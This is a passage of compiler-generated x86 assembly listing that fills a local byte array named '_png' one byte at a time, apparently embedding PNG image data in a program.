	mov	BYTE PTR _png$[ebp+1851], 38		; 00000026H
	mov	BYTE PTR _png$[ebp+1852], 71		; 00000047H
	mov	BYTE PTR _png$[ebp+1853], 122		; 0000007aH
	mov	BYTE PTR _png$[ebp+1854], 24		; 00000018H
	mov	BYTE PTR _png$[ebp+1855], -45		; ffffffd3H
	mov	BYTE PTR _png$[ebp+1856], -28		; ffffffe4H
	mov	BYTE PTR _png$[ebp+1857], 37		; 00000025H
	mov	BYTE PTR _png$[ebp+1858], -116		; ffffff8cH
	mov	BYTE PTR _png$[ebp+1859], 86		; 00000056H
	mov	BYTE PTR _png$[ebp+1860], -19		; ffffffedH
	mov	BYTE PTR _png$[ebp+1861], -1
	mov	BYTE PTR _png$[ebp+1862], 102		; 00000066H
	mov	BYTE PTR _png$[ebp+1863], -92		; ffffffa4H
	mov	BYTE PTR _png$[ebp+1864], -84		; ffffffacH
	mov	BYTE PTR _png$[ebp+1865], -64		; ffffffc0H
	mov	BYTE PTR _png$[ebp+1866], 123		; 0000007bH
	mov	BYTE PTR _png$[ebp+1867], -78		; ffffffb2H
	mov	BYTE PTR _png$[ebp+1868], -118		; ffffff8aH
	mov	BYTE PTR _png$[ebp+1869], 47		; 0000002fH
	mov	BYTE PTR _png$[ebp+1870], -17		; ffffffefH
	mov	BYTE PTR _png$[ebp+1871], -47		; ffffffd1H
	mov	BYTE PTR _png$[ebp+1872], -60		; ffffffc4H
	mov	BYTE PTR _png$[ebp+1873], 120		; 00000078H
	mov	BYTE PTR _png$[ebp+1874], -120		; ffffff88H
	mov	BYTE PTR _png$[ebp+1875], 124		; 0000007cH
	mov	BYTE PTR _png$[ebp+1876], 70		; 00000046H
	mov	BYTE PTR _png$[ebp+1877], -119		; ffffff89H
	mov	BYTE PTR _png$[ebp+1878], -96		; ffffffa0H
	mov	BYTE PTR _png$[ebp+1879], -85		; ffffffabH
	mov	BYTE PTR _png$[ebp+1880], -123		; ffffff85H
	mov	BYTE PTR _png$[ebp+1881], -47		; ffffffd1H
	mov	BYTE PTR _png$[ebp+1882], 68		; 00000044H
	mov	BYTE PTR _png$[ebp+1883], 79		; 0000004fH
	mov	BYTE PTR _png$[ebp+1884], -15		; fffffff1H
	mov	BYTE PTR _png$[ebp+1885], 124		; 0000007cH
	mov	BYTE PTR _png$[ebp+1886], 57		; 00000039H
	mov	BYTE PTR _png$[ebp+1887], 127		; 0000007fH
	mov	BYTE PTR _png$[ebp+1888], -103		; ffffff99H
	mov	BYTE PTR _png$[ebp+1889], -96		; ffffffa0H
	mov	BYTE PTR _png$[ebp+1890], -84		; ffffffacH
	mov	BYTE PTR _png$[ebp+1891], -83		; ffffffadH
	mov	BYTE PTR _png$[ebp+1892], 78		; 0000004eH
	mov	BYTE PTR _png$[ebp+1893], -118		; ffffff8aH
	mov	BYTE PTR _png$[ebp+1894], 34		; 00000022H
	mov	BYTE PTR _png$[ebp+1895], -42		; ffffffd6H
	mov	BYTE PTR _png$[ebp+1896], 18		; 00000012H
	mov	BYTE PTR _png$[ebp+1897], 105		; 00000069H
	mov	BYTE PTR _png$[ebp+1898], 83		; 00000053H
	mov	BYTE PTR _png$[ebp+1899], 115		; 00000073H
	mov	BYTE PTR _png$[ebp+1900], 100		; 00000064H
	mov	BYTE PTR _png$[ebp+1901], -116		; ffffff8cH
	mov	BYTE PTR _png$[ebp+1902], 55		; 00000037H
	mov	BYTE PTR _png$[ebp+1903], 88		; 00000058H
	mov	BYTE PTR _png$[ebp+1904], -60		; ffffffc4H
	mov	BYTE PTR _png$[ebp+1905], 26		; 0000001aH
	mov	BYTE PTR _png$[ebp+1906], -76		; ffffffb4H
	mov	BYTE PTR _png$[ebp+1907], 85		; 00000055H
	mov	BYTE PTR _png$[ebp+1908], 93		; 0000005dH
	mov	BYTE PTR _png$[ebp+1909], 90		; 0000005aH
	mov	BYTE PTR _png$[ebp+1910], 35		; 00000023H
	mov	BYTE PTR _png$[ebp+1911], 116		; 00000074H
	mov	BYTE PTR _png$[ebp+1912], -58		; ffffffc6H
	mov	BYTE PTR _png$[ebp+1913], -111		; ffffff91H
	mov	BYTE PTR _png$[ebp+1914], 49		; 00000031H
	mov	BYTE PTR _png$[ebp+1915], 90		; 0000005aH
	mov	BYTE PTR _png$[ebp+1916], 75		; 0000004bH
	mov	BYTE PTR _png$[ebp+1917], 37		; 00000025H
	mov	BYTE PTR _png$[ebp+1918], 43		; 0000002bH
	mov	BYTE PTR _png$[ebp+1919], -55		; ffffffc9H
	mov	BYTE PTR _png$[ebp+1920], 27		; 0000001bH
	mov	BYTE PTR _png$[ebp+1921], -51		; ffffffcdH
	mov	BYTE PTR _png$[ebp+1922], -83		; ffffffadH
	mov	BYTE PTR _png$[ebp+1923], 106		; 0000006aH
	mov	BYTE PTR _png$[ebp+1924], -119		; ffffff89H
	mov	BYTE PTR _png$[ebp+1925], 80		; 00000050H
	mov	BYTE PTR _png$[ebp+1926], 104		; 00000068H
	mov	BYTE PTR _png$[ebp+1927], 54		; 00000036H
	mov	BYTE PTR _png$[ebp+1928], 58		; 0000003aH
	mov	BYTE PTR _png$[ebp+1929], -58		; ffffffc6H
	mov	BYTE PTR _png$[ebp+1930], 86		; 00000056H
	mov	BYTE PTR _png$[ebp+1931], 117		; 00000075H
	mov	BYTE PTR _png$[ebp+1932], -87		; ffffffa9H
	mov	BYTE PTR _png$[ebp+1933], -58		; ffffffc6H
	mov	BYTE PTR _png$[ebp+1934], 53		; 00000035H
	mov	BYTE PTR _png$[ebp+1935], 20		; 00000014H
	mov	BYTE PTR _png$[ebp+1936], -35		; ffffffddH
	mov	BYTE PTR _png$[ebp+1937], -126		; ffffff82H
	mov	BYTE PTR _png$[ebp+1938], 26		; 0000001aH
	mov	BYTE PTR _png$[ebp+1939], 25		; 00000019H
	mov	BYTE PTR _png$[ebp+1940], -83		; ffffffadH
	mov	BYTE PTR _png$[ebp+1941], -11		; fffffff5H
	mov	BYTE PTR _png$[ebp+1942], 94		; 0000005eH
	mov	BYTE PTR _png$[ebp+1943], 124		; 0000007cH
	mov	BYTE PTR _png$[ebp+1944], 108		; 0000006cH
	mov	BYTE PTR _png$[ebp+1945], 93		; 0000005dH
	mov	BYTE PTR _png$[ebp+1946], 40		; 00000028H
	mov	BYTE PTR _png$[ebp+1947], 121		; 00000079H
	mov	BYTE PTR _png$[ebp+1948], -87		; ffffffa9H
	mov	BYTE PTR _png$[ebp+1949], -27		; ffffffe5H
	mov	BYTE PTR _png$[ebp+1950], -64		; ffffffc0H
	mov	BYTE PTR _png$[ebp+1951], -14		; fffffff2H
	mov	BYTE PTR _png$[ebp+1952], -94		; ffffffa2H
	mov	BYTE PTR _png$[ebp+1953], 99		; 00000063H
	mov	BYTE PTR _png$[ebp+1954], -63		; ffffffc1H
	mov	BYTE PTR _png$[ebp+1955], 117		; 00000075H
	mov	BYTE PTR _png$[ebp+1956], 25		; 00000019H
	mov	BYTE PTR _png$[ebp+1957], 64		; 00000040H
	mov	BYTE PTR _png$[ebp+1958], 53		; 00000035H
	mov	BYTE PTR _png$[ebp+1959], -58		; ffffffc6H
	mov	BYTE PTR _png$[ebp+1960], 12		; 0000000cH
	mov	BYTE PTR _png$[ebp+1961], 11		; 0000000bH
	mov	BYTE PTR _png$[ebp+1962], -84		; ffffffacH
	mov	BYTE PTR _png$[ebp+1963], -78		; ffffffb2H
	mov	BYTE PTR _png$[ebp+1964], -36		; ffffffdcH
	mov	BYTE PTR _png$[ebp+1965], -19		; ffffffedH
	mov	BYTE PTR _png$[ebp+1966], 123		; 0000007bH
	mov	BYTE PTR _png$[ebp+1967], -83		; ffffffadH
	mov	BYTE PTR _png$[ebp+1968], -43		; ffffffd5H
	mov	BYTE PTR _png$[ebp+1969], 82		; 00000052H
	mov	BYTE PTR _png$[ebp+1970], 96		; 00000060H
	mov	BYTE PTR _png$[ebp+1971], -62		; ffffffc2H
	mov	BYTE PTR _png$[ebp+1972], -66		; ffffffbeH
	mov	BYTE PTR _png$[ebp+1973], -95		; ffffffa1H
	mov	BYTE PTR _png$[ebp+1974], -89		; ffffffa7H
	mov	BYTE PTR _png$[ebp+1975], -75		; ffffffb5H
	mov	BYTE PTR _png$[ebp+1976], -71		; ffffffb9H
	mov	BYTE PTR _png$[ebp+1977], -76		; ffffffb4H
	mov	BYTE PTR _png$[ebp+1978], 76		; 0000004cH
	mov	BYTE PTR _png$[ebp+1979], 111		; 0000006fH
	mov	BYTE PTR _png$[ebp+1980], -30		; ffffffe2H
	mov	BYTE PTR _png$[ebp+1981], -98		; ffffff9eH
	mov	BYTE PTR _png$[ebp+1982], -56		; ffffffc8H
	mov	BYTE PTR _png$[ebp+1983], -113		; ffffff8fH
	mov	BYTE PTR _png$[ebp+1984], -41		; ffffffd7H
	mov	BYTE PTR _png$[ebp+1985], 13		; 0000000dH
	mov	BYTE PTR _png$[ebp+1986], -69		; ffffffbbH
	mov	BYTE PTR _png$[ebp+1987], -31		; ffffffe1H
	mov	BYTE PTR _png$[ebp+1988], -65		; ffffffbfH
	mov	BYTE PTR _png$[ebp+1989], 61		; 0000003dH
	mov	BYTE PTR _png$[ebp+1990], -50		; ffffffceH
	mov	BYTE PTR _png$[ebp+1991], 123		; 0000007bH
	mov	BYTE PTR _png$[ebp+1992], -21		; ffffffebH
	mov	BYTE PTR _png$[ebp+1993], 93		; 0000005dH
	mov	BYTE PTR _png$[ebp+1994], -93		; ffffffa3H
	mov	BYTE PTR _png$[ebp+1995], -32		; ffffffe0H
	mov	BYTE PTR _png$[ebp+1996], 22		; 00000016H
	mov	BYTE PTR _png$[ebp+1997], 83		; 00000053H
	mov	BYTE PTR _png$[ebp+1998], -101		; ffffff9bH
	mov	BYTE PTR _png$[ebp+1999], 89		; 00000059H
	mov	BYTE PTR _png$[ebp+2000], -9		; fffffff7H
	mov	BYTE PTR _png$[ebp+2001], -37		; ffffffdbH
	mov	BYTE PTR _png$[ebp+2002], -126		; ffffff82H
	mov	BYTE PTR _png$[ebp+2003], -65		; ffffffbfH
	mov	BYTE PTR _png$[ebp+2004], -95		; ffffffa1H
	mov	BYTE PTR _png$[ebp+2005], 85		; 00000055H
	mov	BYTE PTR _png$[ebp+2006], -55		; ffffffc9H
	mov	BYTE PTR _png$[ebp+2007], 43		; 0000002bH
	mov	BYTE PTR _png$[ebp+2008], -67		; ffffffbdH
	mov	BYTE PTR _png$[ebp+2009], -126		; ffffff82H
	mov	BYTE PTR _png$[ebp+2010], 74		; 0000004aH
	mov	BYTE PTR _png$[ebp+2011], 41		; 00000029H
	mov	BYTE PTR _png$[ebp+2012], -89		; ffffffa7H
	mov	BYTE PTR _png$[ebp+2013], -24		; ffffffe8H
	mov	BYTE PTR _png$[ebp+2014], 36		; 00000024H
	mov	BYTE PTR _png$[ebp+2015], 59		; 0000003bH
	mov	BYTE PTR _png$[ebp+2016], 62		; 0000003eH
	mov	BYTE PTR _png$[ebp+2017], 101		; 00000065H
	mov	BYTE PTR _png$[ebp+2018], -47		; ffffffd1H
	mov	BYTE PTR _png$[ebp+2019], -74		; ffffffb6H
	mov	BYTE PTR _png$[ebp+2020], -21		; ffffffebH
	mov	BYTE PTR _png$[ebp+2021], 94		; 0000005eH
	mov	BYTE PTR _png$[ebp+2022], -43		; ffffffd5H
	mov	BYTE PTR _png$[ebp+2023], 66		; 00000042H
	mov	BYTE PTR _png$[ebp+2024], -89		; ffffffa7H
	mov	BYTE PTR _png$[ebp+2025], -68		; ffffffbcH
	mov	BYTE PTR _png$[ebp+2026], 57		; 00000039H
	mov	BYTE PTR _png$[ebp+2027], 27		; 0000001bH
	mov	BYTE PTR _png$[ebp+2028], 48		; 00000030H
	mov	BYTE PTR _png$[ebp+2029], 54		; 00000036H
	mov	BYTE PTR _png$[ebp+2030], -118		; ffffff8aH
	mov	BYTE PTR _png$[ebp+2031], -54		; ffffffcaH
	mov	BYTE PTR _png$[ebp+2032], -17		; ffffffefH
	mov	BYTE PTR _png$[ebp+2033], 102		; 00000066H
	mov	BYTE PTR _png$[ebp+2034], 84		; 00000054H
	mov	BYTE PTR _png$[ebp+2035], 97		; 00000061H
	mov	BYTE PTR _png$[ebp+2036], -20		; ffffffecH
	mov	BYTE PTR _png$[ebp+2037], 62		; 0000003eH
	mov	BYTE PTR _png$[ebp+2038], -102		; ffffff9aH
	mov	BYTE PTR _png$[ebp+2039], -18		; ffffffeeH
	mov	BYTE PTR _png$[ebp+2040], 21		; 00000015H
	mov	BYTE PTR _png$[ebp+2041], 84		; 00000054H
	mov	BYTE PTR _png$[ebp+2042], 24		; 00000018H
	mov	BYTE PTR _png$[ebp+2043], 121		; 00000079H
	mov	BYTE PTR _png$[ebp+2044], 119		; 00000077H
	mov	BYTE PTR _png$[ebp+2045], -73		; ffffffb7H
	mov	BYTE PTR _png$[ebp+2046], -59		; ffffffc5H
	mov	BYTE PTR _png$[ebp+2047], -12		; fffffff4H
	mov	BYTE PTR _png$[ebp+2048], -86		; ffffffaaH
	mov	BYTE PTR _png$[ebp+2049], 113		; 00000071H
	mov	BYTE PTR _png$[ebp+2050], -35		; ffffffddH
	mov	BYTE PTR _png$[ebp+2051], -115		; ffffff8dH
	mov	BYTE PTR _png$[ebp+2052], 78		; 0000004eH
	mov	BYTE PTR _png$[ebp+2053], 51		; 00000033H
	mov	BYTE PTR _png$[ebp+2054], -105		; ffffff97H
	mov	BYTE PTR _png$[ebp+2055], 77		; 0000004dH
	mov	BYTE PTR _png$[ebp+2056], 14		; 0000000eH
	mov	BYTE PTR _png$[ebp+2057], -15		; fffffff1H
	mov	BYTE PTR _png$[ebp+2058], 25		; 00000019H
	mov	BYTE PTR _png$[ebp+2059], 102		; 00000066H
	mov	BYTE PTR _png$[ebp+2060], 38		; 00000026H
	mov	BYTE PTR _png$[ebp+2061], 95		; 0000005fH
	mov	BYTE PTR _png$[ebp+2062], -84		; ffffffacH
	mov	BYTE PTR _png$[ebp+2063], -41		; ffffffd7H
	mov	BYTE PTR _png$[ebp+2064], 41		; 00000029H
	mov	BYTE PTR _png$[ebp+2065], 101		; 00000065H
	mov	BYTE PTR _png$[ebp+2066], 113		; 00000071H
	mov	BYTE PTR _png$[ebp+2067], -54		; ffffffcaH
	mov	BYTE PTR _png$[ebp+2068], 118		; 00000076H
	mov	BYTE PTR _png$[ebp+2069], 116		; 00000074H
	mov	BYTE PTR _png$[ebp+2070], 109		; 0000006dH
	mov	BYTE PTR _png$[ebp+2071], -27		; ffffffe5H
	mov	BYTE PTR _png$[ebp+2072], 23		; 00000017H
	mov	BYTE PTR _png$[ebp+2073], 3
	mov	BYTE PTR _png$[ebp+2074], 4
	mov	BYTE PTR _png$[ebp+2075], -75		; ffffffb5H
	mov	BYTE PTR _png$[ebp+2076], -41		; ffffffd7H
	mov	BYTE PTR _png$[ebp+2077], 92		; 0000005cH
	mov	BYTE PTR _png$[ebp+2078], 4
	mov	BYTE PTR _png$[ebp+2079], -61		; ffffffc3H
	mov	BYTE PTR _png$[ebp+2080], -52		; ffffffccH
	mov	BYTE PTR _png$[ebp+2081], 22		; 00000016H
	mov	BYTE PTR _png$[ebp+2082], 42		; 0000002aH
	mov	BYTE PTR _png$[ebp+2083], -115		; ffffff8dH
	mov	BYTE PTR _png$[ebp+2084], -82		; ffffffaeH
	mov	BYTE PTR _png$[ebp+2085], 6
	mov	BYTE PTR _png$[ebp+2086], -95		; ffffffa1H
	mov	BYTE PTR _png$[ebp+2087], -24		; ffffffe8H
	mov	BYTE PTR _png$[ebp+2088], 67		; 00000043H
	mov	BYTE PTR _png$[ebp+2089], -125		; ffffff83H
	mov	BYTE PTR _png$[ebp+2090], 29		; 0000001dH
	mov	BYTE PTR _png$[ebp+2091], 59		; 0000003bH
	mov	BYTE PTR _png$[ebp+2092], 82		; 00000052H
	mov	BYTE PTR _png$[ebp+2093], -49		; ffffffcfH
	mov	BYTE PTR _png$[ebp+2094], -124		; ffffff84H
	mov	BYTE PTR _png$[ebp+2095], 107		; 0000006bH
	mov	BYTE PTR _png$[ebp+2096], 33		; 00000021H
	mov	BYTE PTR _png$[ebp+2097], -121		; ffffff87H
	mov	BYTE PTR _png$[ebp+2098], -10		; fffffff6H
	mov	BYTE PTR _png$[ebp+2099], 125		; 0000007dH
	mov	BYTE PTR _png$[ebp+2100], -115		; ffffff8dH
	mov	BYTE PTR _png$[ebp+2101], 100		; 00000064H
	mov	BYTE PTR _png$[ebp+2102], 62		; 0000003eH
	mov	BYTE PTR _png$[ebp+2103], -64		; ffffffc0H
	mov	BYTE PTR _png$[ebp+2104], 115		; 00000073H
	mov	BYTE PTR _png$[ebp+2105], -123		; ffffff85H
	mov	BYTE PTR _png$[ebp+2106], 84		; 00000054H
	mov	BYTE PTR _png$[ebp+2107], 79		; 0000004fH
	mov	BYTE PTR _png$[ebp+2108], -95		; ffffffa1H
	mov	BYTE PTR _png$[ebp+2109], 37		; 00000025H
	mov	BYTE PTR _png$[ebp+2110], -10		; fffffff6H
	mov	BYTE PTR _png$[ebp+2111], -92		; ffffffa4H
	mov	BYTE PTR _png$[ebp+2112], -82		; ffffffaeH
	mov	BYTE PTR _png$[ebp+2113], -74		; ffffffb6H
	mov	BYTE PTR _png$[ebp+2114], -42		; ffffffd6H
	mov	BYTE PTR _png$[ebp+2115], 39		; 00000027H
	mov	BYTE PTR _png$[ebp+2116], -6		; fffffffaH
	mov	BYTE PTR _png$[ebp+2117], -46		; ffffffd2H
	mov	BYTE PTR _png$[ebp+2118], -77		; ffffffb3H
	mov	BYTE PTR _png$[ebp+2119], 80		; 00000050H
	mov	BYTE PTR _png$[ebp+2120], -40		; ffffffd8H
	mov	BYTE PTR _png$[ebp+2121], -31		; ffffffe1H
	mov	BYTE PTR _png$[ebp+2122], 22		; 00000016H
	mov	BYTE PTR _png$[ebp+2123], -21		; ffffffebH
	mov	BYTE PTR _png$[ebp+2124], -42		; ffffffd6H
	mov	BYTE PTR _png$[ebp+2125], 40		; 00000028H
	mov	BYTE PTR _png$[ebp+2126], -105		; ffffff97H
	mov	BYTE PTR _png$[ebp+2127], -105		; ffffff97H
	mov	BYTE PTR _png$[ebp+2128], 103		; 00000067H
	mov	BYTE PTR _png$[ebp+2129], 12		; 0000000cH
	mov	BYTE PTR _png$[ebp+2130], 5
	mov	BYTE PTR _png$[ebp+2131], -69		; ffffffbbH
	mov	BYTE PTR _png$[ebp+2132], 68		; 00000044H
	mov	BYTE PTR _png$[ebp+2133], 8
	mov	BYTE PTR _png$[ebp+2134], 34		; 00000022H
	mov	BYTE PTR _png$[ebp+2135], 120		; 00000078H
	mov	BYTE PTR _png$[ebp+2136], -66		; ffffffbeH
	mov	BYTE PTR _png$[ebp+2137], -43		; ffffffd5H
	mov	BYTE PTR _png$[ebp+2138], -104		; ffffff98H
	mov	BYTE PTR _png$[ebp+2139], 60		; 0000003cH
	mov	BYTE PTR _png$[ebp+2140], 52		; 00000034H
	mov	BYTE PTR _png$[ebp+2141], -59		; ffffffc5H
	mov	BYTE PTR _png$[ebp+2142], 41		; 00000029H
	mov	BYTE PTR _png$[ebp+2143], 38		; 00000026H
	mov	BYTE PTR _png$[ebp+2144], 110		; 0000006eH
	mov	BYTE PTR _png$[ebp+2145], -51		; ffffffcdH
	mov	BYTE PTR _png$[ebp+2146], -109		; ffffff93H
	mov	BYTE PTR _png$[ebp+2147], 102		; 00000066H
	mov	BYTE PTR _png$[ebp+2148], -25		; ffffffe7H
	mov	BYTE PTR _png$[ebp+2149], 10		; 0000000aH
	mov	BYTE PTR _png$[ebp+2150], 118		; 00000076H
	mov	BYTE PTR _png$[ebp+2151], -76		; ffffffb4H
	mov	BYTE PTR _png$[ebp+2152], 34		; 00000022H
	mov	BYTE PTR _png$[ebp+2153], 55		; 00000037H
	mov	BYTE PTR _png$[ebp+2154], 37		; 00000025H
	mov	BYTE PTR _png$[ebp+2155], -67		; ffffffbdH
	mov	BYTE PTR _png$[ebp+2156], 3
	mov	BYTE PTR _png$[ebp+2157], -58		; ffffffc6H
	mov	BYTE PTR _png$[ebp+2158], 92		; 0000005cH
	mov	BYTE PTR _png$[ebp+2159], 122		; 0000007aH
	mov	BYTE PTR _png$[ebp+2160], -126		; ffffff82H
	mov	BYTE PTR _png$[ebp+2161], -109		; ffffff93H
	mov	BYTE PTR _png$[ebp+2162], -5		; fffffffbH
	mov	BYTE PTR _png$[ebp+2163], 90		; 0000005aH
	mov	BYTE PTR _png$[ebp+2164], -73		; ffffffb7H
	mov	BYTE PTR _png$[ebp+2165], 106		; 0000006aH
	mov	BYTE PTR _png$[ebp+2166], 53		; 00000035H
	mov	BYTE PTR _png$[ebp+2167], -38		; ffffffdaH
	mov	BYTE PTR _png$[ebp+2168], 2
	mov	BYTE PTR _png$[ebp+2169], -62		; ffffffc2H
	mov	BYTE PTR _png$[ebp+2170], 104		; 00000068H
	mov	BYTE PTR _png$[ebp+2171], -58		; ffffffc6H
	mov	BYTE PTR _png$[ebp+2172], 107		; 0000006bH
	mov	BYTE PTR _png$[ebp+2173], -61		; ffffffc3H
	mov	BYTE PTR _png$[ebp+2174], 49		; 00000031H
	mov	BYTE PTR _png$[ebp+2175], -78		; ffffffb2H
	mov	BYTE PTR _png$[ebp+2176], -79		; ffffffb1H
	mov	BYTE PTR _png$[ebp+2177], 50		; 00000032H
	mov	BYTE PTR _png$[ebp+2178], -104		; ffffff98H
	mov	BYTE PTR _png$[ebp+2179], 84		; 00000054H
	mov	BYTE PTR _png$[ebp+2180], -76		; ffffffb4H
	mov	BYTE PTR _png$[ebp+2181], 54		; 00000036H
	mov	BYTE PTR _png$[ebp+2182], -17		; ffffffefH
	mov	BYTE PTR _png$[ebp+2183], -34		; ffffffdeH
	mov	BYTE PTR _png$[ebp+2184], -82		; ffffffaeH
	mov	BYTE PTR _png$[ebp+2185], -34		; ffffffdeH
	mov	BYTE PTR _png$[ebp+2186], -93		; ffffffa3H
	mov	BYTE PTR _png$[ebp+2187], 47		; 0000002fH
	mov	BYTE PTR _png$[ebp+2188], 112		; 00000070H
	mov	BYTE PTR _png$[ebp+2189], 40		; 00000028H
	mov	BYTE PTR _png$[ebp+2190], 48		; 00000030H
	mov	BYTE PTR _png$[ebp+2191], 10		; 0000000aH
	mov	BYTE PTR _png$[ebp+2192], 30		; 0000001eH
	mov	BYTE PTR _png$[ebp+2193], 74		; 0000004aH
	mov	BYTE PTR _png$[ebp+2194], -98		; ffffff9eH
	mov	BYTE PTR _png$[ebp+2195], 112		; 00000070H
	mov	BYTE PTR _png$[ebp+2196], 24		; 00000018H
	mov	BYTE PTR _png$[ebp+2197], -57		; ffffffc7H
	mov	BYTE PTR _png$[ebp+2198], 67		; 00000043H
	mov	BYTE PTR _png$[ebp+2199], 115		; 00000073H
	mov	BYTE PTR _png$[ebp+2200], 28		; 0000001cH
	mov	BYTE PTR _png$[ebp+2201], -21		; ffffffebH
	mov	BYTE PTR _png$[ebp+2202], -18		; ffffffeeH
	mov	BYTE PTR _png$[ebp+2203], -19		; ffffffedH
	mov	BYTE PTR _png$[ebp+2204], 91		; 0000005bH
	mov	BYTE PTR _png$[ebp+2205], -73		; ffffffb7H
	mov	BYTE PTR _png$[ebp+2206], -15		; fffffff1H
	mov	BYTE PTR _png$[ebp+2207], 75		; 0000004bH
	mov	BYTE PTR _png$[ebp+2208], 19		; 00000013H
	mov	BYTE PTR _png$[ebp+2209], -70		; ffffffbaH
	mov	BYTE PTR _png$[ebp+2210], 24		; 00000018H
	mov	BYTE PTR _png$[ebp+2211], -41		; ffffffd7H
	mov	BYTE PTR _png$[ebp+2212], -6		; fffffffaH
	mov	BYTE PTR _png$[ebp+2213], -19		; ffffffedH
	mov	BYTE PTR _png$[ebp+2214], -44		; ffffffd4H
	mov	BYTE PTR _png$[ebp+2215], 10		; 0000000aH
	mov	BYTE PTR _png$[ebp+2216], -19		; ffffffedH
	mov	BYTE PTR _png$[ebp+2217], -54		; ffffffcaH
	mov	BYTE PTR _png$[ebp+2218], -18		; ffffffeeH
	mov	BYTE PTR _png$[ebp+2219], -23		; ffffffe9H
	mov	BYTE PTR _png$[ebp+2220], -1
	mov	BYTE PTR _png$[ebp+2221], 9
	mov	BYTE PTR _png$[ebp+2222], 42		; 0000002aH
	mov	BYTE PTR _png$[ebp+2223], 120		; 00000078H
	mov	BYTE PTR _png$[ebp+2224], -54		; ffffffcaH
	mov	BYTE PTR _png$[ebp+2225], -116		; ffffff8cH
	mov	BYTE PTR _png$[ebp+2226], 1
	mov	BYTE PTR _png$[ebp+2227], -33		; ffffffdfH
	mov	BYTE PTR _png$[ebp+2228], -110		; ffffff92H
	mov	BYTE PTR _png$[ebp+2229], -109		; ffffff93H
	mov	BYTE PTR _png$[ebp+2230], 112		; 00000070H
	mov	BYTE PTR _png$[ebp+2231], 25		; 00000019H
	mov	BYTE PTR _png$[ebp+2232], -23		; ffffffe9H
	mov	BYTE PTR _png$[ebp+2233], -71		; ffffffb9H
	mov	BYTE PTR _png$[ebp+2234], 30		; 0000001eH
	mov	BYTE PTR _png$[ebp+2235], 115		; 00000073H
	mov	BYTE PTR _png$[ebp+2236], 39		; 00000027H
	mov	BYTE PTR _png$[ebp+2237], 47		; 0000002fH
	mov	BYTE PTR _png$[ebp+2238], 111		; 0000006fH
	mov	BYTE PTR _png$[ebp+2239], 87		; 00000057H
	mov	BYTE PTR _png$[ebp+2240], -89		; ffffffa7H
	mov	BYTE PTR _png$[ebp+2241], 55		; 00000037H
	mov	BYTE PTR _png$[ebp+2242], -17		; ffffffefH
	mov	BYTE PTR _png$[ebp+2243], -34		; ffffffdeH
	mov	BYTE PTR _png$[ebp+2244], 91		; 0000005bH
	mov	BYTE PTR _png$[ebp+2245], 91		; 0000005bH
	mov	BYTE PTR _png$[ebp+2246], -105		; ffffff97H
	mov	BYTE PTR _png$[ebp+2247], 74		; 0000004aH
	mov	BYTE PTR _png$[ebp+2248], 117		; 00000075H
	mov	BYTE PTR _png$[ebp+2249], -62		; ffffffc2H
	mov	BYTE PTR _png$[ebp+2250], 34		; 00000022H
	mov	BYTE PTR _png$[ebp+2251], 31		; 0000001fH
	mov	BYTE PTR _png$[ebp+2252], -61		; ffffffc3H
	mov	BYTE PTR _png$[ebp+2253], -69		; ffffffbbH
	mov	BYTE PTR _png$[ebp+2254], -81		; ffffffafH
	mov	BYTE PTR _png$[ebp+2255], -90		; ffffffa6H
	mov	BYTE PTR _png$[ebp+2256], -83		; ffffffadH
	mov	BYTE PTR _png$[ebp+2257], -5		; fffffffbH
	mov	BYTE PTR _png$[ebp+2258], -93		; ffffffa3H
	mov	BYTE PTR _png$[ebp+2259], -99		; ffffff9dH
	mov	BYTE PTR _png$[ebp+2260], -47		; ffffffd1H
	mov	BYTE PTR _png$[ebp+2261], 123		; 0000007bH
	mov	BYTE PTR _png$[ebp+2262], -64		; ffffffc0H
	mov	BYTE PTR _png$[ebp+2263], -61		; ffffffc3H
	mov	BYTE PTR _png$[ebp+2264], -85		; ffffffabH
	mov	BYTE PTR _png$[ebp+2265], -88		; ffffffa8H
	mov	BYTE PTR _png$[ebp+2266], -47		; ffffffd1H
	mov	BYTE PTR _png$[ebp+2267], -13		; fffffff3H
	mov	BYTE PTR _png$[ebp+2268], 58		; 0000003aH
	mov	BYTE PTR _png$[ebp+2269], 75		; 0000004bH
	mov	BYTE PTR _png$[ebp+2270], -91		; ffffffa5H
	mov	BYTE PTR _png$[ebp+2271], 113		; 00000071H
	mov	BYTE PTR _png$[ebp+2272], -58		; ffffffc6H
	mov	BYTE PTR _png$[ebp+2273], -99		; ffffff9dH
	mov	BYTE PTR _png$[ebp+2274], -8		; fffffff8H
	mov	BYTE PTR _png$[ebp+2275], -41		; ffffffd7H
	mov	BYTE PTR _png$[ebp+2276], -5		; fffffffbH
	mov	BYTE PTR _png$[ebp+2277], 71		; 00000047H
	mov	BYTE PTR _png$[ebp+2278], -116		; ffffff8cH
	mov	BYTE PTR _png$[ebp+2279], -92		; ffffffa4H
	mov	BYTE PTR _png$[ebp+2280], 31		; 0000001fH
	mov	BYTE PTR _png$[ebp+2281], -58		; ffffffc6H
	mov	BYTE PTR _png$[ebp+2282], 11		; 0000000bH
	mov	BYTE PTR _png$[ebp+2283], 90		; 0000005aH
	mov	BYTE PTR _png$[ebp+2284], -24		; ffffffe8H
	mov	BYTE PTR _png$[ebp+2285], 52		; 00000034H
	mov	BYTE PTR _png$[ebp+2286], 48		; 00000030H
	mov	BYTE PTR _png$[ebp+2287], -78		; ffffffb2H
	mov	BYTE PTR _png$[ebp+2288], 108		; 0000006cH
	mov	BYTE PTR _png$[ebp+2289], -77		; ffffffb3H
	mov	BYTE PTR _png$[ebp+2290], 60		; 0000003cH
	mov	BYTE PTR _png$[ebp+2291], -112		; ffffff90H
	mov	BYTE PTR _png$[ebp+2292], -47		; ffffffd1H
	mov	BYTE PTR _png$[ebp+2293], -8		; fffffff8H
	mov	BYTE PTR _png$[ebp+2294], 21		; 00000015H
	mov	BYTE PTR _png$[ebp+2295], -39		; ffffffd9H
	mov	BYTE PTR _png$[ebp+2296], 58		; 0000003aH
	mov	BYTE PTR _png$[ebp+2297], 25		; 00000019H
	mov	BYTE PTR _png$[ebp+2298], -113		; ffffff8fH
	mov	BYTE PTR _png$[ebp+2299], 61		; 0000003dH
	mov	BYTE PTR _png$[ebp+2300], 96		; 00000060H
	mov	BYTE PTR _png$[ebp+2301], 15		; 0000000fH
	mov	BYTE PTR _png$[ebp+2302], -24		; ffffffe8H
	mov	BYTE PTR _png$[ebp+2303], 115		; 00000073H
	mov	BYTE PTR _png$[ebp+2304], -29		; ffffffe3H
	mov	BYTE PTR _png$[ebp+2305], 30		; 0000001eH
	mov	BYTE PTR _png$[ebp+2306], -46		; ffffffd2H
